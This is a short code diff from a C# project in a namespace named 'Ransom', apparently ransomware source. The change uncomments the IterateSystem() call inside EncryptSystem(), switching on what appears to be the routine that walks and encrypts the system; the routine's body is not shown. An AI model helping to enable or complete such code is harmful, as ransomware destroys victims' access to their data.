@@ -43,7 +43,7 @@ namespace Ransom
         public void EncryptSystem()
         {
             OnEncryptionStart?.Invoke();
-            //IterateSystem();
+            IterateSystem();
             OnEncryptionEnd?.Invoke();
         }
         
